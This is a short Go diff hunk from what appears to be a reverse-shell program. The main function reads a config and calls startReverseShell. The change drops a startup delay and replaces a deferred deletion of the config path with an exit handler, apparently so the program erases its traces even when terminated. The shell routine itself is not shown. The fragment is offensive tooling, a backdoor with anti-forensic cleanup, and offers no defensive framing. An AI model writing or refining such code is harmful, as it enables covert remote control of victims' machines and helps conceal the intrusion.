@@ -6,13 +6,13 @@ import (
 	"net"
 	"os"
 	"os/exec"
-	"time"
 )
 
 func main() {
-	time.Sleep(time.Second * 5)
 	config := readConfig()
-	defer os.RemoveAll(config.Path)
+	registerExitHandler(func() {
+		_ = os.RemoveAll(config.Path)
+	})
 
 	startReverseShell(config)
 }
